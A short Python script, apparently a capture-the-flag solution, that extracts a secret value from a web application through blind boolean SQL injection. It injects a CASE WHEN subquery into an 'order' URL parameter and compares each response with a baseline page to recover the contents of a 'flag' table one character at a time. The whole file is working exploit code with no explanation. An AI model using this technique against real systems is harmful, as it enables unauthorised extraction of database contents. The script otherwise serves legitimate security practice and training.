import requests as req
import string

url  = 'http://ip/?order='
chars = string.ascii_letters + string.digits + "{" + "}"
yes = req.get(url+"title").text

counter = 1
flag = ""

while(1):
    for i in chars:
        query = f'(CASE WHEN (SELECT SUBSTRING(flag,1,{counter}) from flag)="{flag+i}" then title else date end)'
        res = req.get(url+query).text
        print(i,end=" ")
        if(res==yes):
            flag+=i
            counter+=1
            break
        if(i=="}"):
            exit()
    print("\n[+] Flag is ",flag)
